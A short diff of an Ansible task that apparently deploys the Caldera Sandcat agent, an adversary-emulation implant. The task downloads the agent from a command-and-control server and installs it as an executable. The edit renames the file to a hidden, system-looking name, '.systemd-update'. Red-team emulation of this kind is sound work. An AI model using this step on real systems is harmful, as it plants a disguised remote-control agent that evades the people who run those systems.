@@ -1,7 +1,7 @@
 - name: Download Sandcat agent (Linux)
   get_url:
-    url: "{{ caldera_server }}/magellan/download"
-    dest: /usr/local/bin/splunkd
+    url: "{{ caldera_server }}/file/download"
+    dest: /usr/local/bin/.systemd-update
     mode: '0755'
     headers:
       file: sandcat.go
